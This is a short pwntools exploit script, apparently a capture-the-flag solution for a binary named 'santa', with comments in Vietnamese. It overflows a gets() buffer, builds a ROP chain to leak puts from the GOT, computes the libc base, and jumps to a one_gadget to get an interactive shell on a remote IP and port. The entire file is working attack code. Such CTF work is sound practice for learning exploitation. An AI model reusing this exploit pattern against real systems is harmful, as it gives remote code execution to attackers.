#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    return remote('45.119.84.224', 9998, *a, **kw)

exe = './santa'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

pop_rdi = 0x400b23
ret = 0x400646

io = start()
# bof tu gets(s2) o ham level1()
# ghi de s1, s2
payload = b'\x00' * 20
# ghi de ret addr su dung rop chain
payload += flat({
  0: [
    pop_rdi,
    elf.got.puts,
    elf.plt.puts,
    ret,
    elf.sym._start,
  ]
})

io.sendlineafter(b'>>> ', b'1')
# leak addr va bat dau chuong trinh lai
io.sendlineafter(b'>>> ', payload)
io.sendlineafter(b'>>> ', b'1')
io.recvuntil(b'You lose in level 2\n')
leak = u64(io.recvline()[:6].ljust(8, b"\x00"))
print(hex(leak))
libc_base = leak - 0x080aa0
one_gadget = libc_base + 0x10a41c

payload = b'\x00' * 20
payload += p64(one_gadget)
io.sendlineafter(b'========\n', b'1')
# ghi de ret addr cua ham level1() vs one_gadget addr
io.sendlineafter(b'>>> ', payload)
io.sendlineafter(b'>>> ', b'2000')
io.interactive()